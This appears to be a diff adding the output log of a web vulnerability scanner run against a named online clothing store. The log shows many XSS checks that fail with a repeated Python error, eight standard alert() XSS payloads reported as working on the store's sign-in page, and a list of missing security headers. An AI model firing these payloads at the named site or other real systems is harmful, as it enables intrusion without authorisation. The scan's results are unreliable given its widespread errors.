@@ -1,0 +1,63 @@
+Web Vulnerability Scanner Report
+Target URL: https://www.sadiqstore.com/
+Scan Summary:
+
+[+] No SQL injection vulnerabilities detected
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men/Unstitched-for-men/Latha: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/All-season-wear/Festive-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Winter-unstitched/1-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/wishlist/user/signin/profile: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Winter-unstitched/2-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/admin/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/faqs: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/terms-conditions: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Ready-to-wear/Wedding-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/blog-news: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Winter-unstitched: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/about-us: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Summer-unstitched: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men/Shawl: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Jewelry: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/All-season-wear/Wedding-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men/Unstitched-for-men: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/cart/user/signin/profile: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men/Shawl/Woolen-shawl: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/account/google-signin: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/wishlist/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/privacy-policy: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/sale: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Jewelry/Necklace: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/sitemap: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Summer-unstitched/1-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/checkout/google-signin: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Ready-to-wear/Party-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/orders-returns: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men/Unstitched-for-men/Wash-and-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Ready-to-wear: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/password-reset/user/signin/profile: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Summer-unstitched/2-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/cart/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/admin/user/signin/profile: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Ready-to-wear/Casual-wear: 'NoneType' object has no attribute 'lower'
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <script>alert('XSS')</script>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <img src=x onerror=alert('XSS')>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <body onload=alert('XSS')>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: '><script>alert('XSS')</script>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <svg/onload=alert('XSS')>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <iframe src=javascript:alert('XSS')>
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <math><maction xlink:href="javascript:alert('XSS')">
+[!] XSS vulnerability found at https://www.sadiqstore.com/user/signin/ with payload: <object type="text/html" data="javascript:alert('XSS')">
+[!] Error checking XSS at https://www.sadiqstore.com/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/new-arrivals: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Summer-unstitched/Eid-collection: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/brands: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/password-reset/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Winter-unstitched/3-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/Summer-unstitched/3-piece: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Men: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/careers/: 'NoneType' object has no attribute 'lower'
+[!] Error checking XSS at https://www.sadiqstore.com/shop/Women/All-season-wear: 'NoneType' object has no attribute 'lower'
+[!] Missing headers for https://www.sadiqstore.com/user/: X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Strict-Transport-Security, Content-Security-Policy, Referrer-Policy, Permissions-Policy
+[!] Missing headers for https://www.sadiqstore.com/brands: X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Strict-Transport-Security, Content-Security-Policy, Referrer-Policy, Permissions-Policy
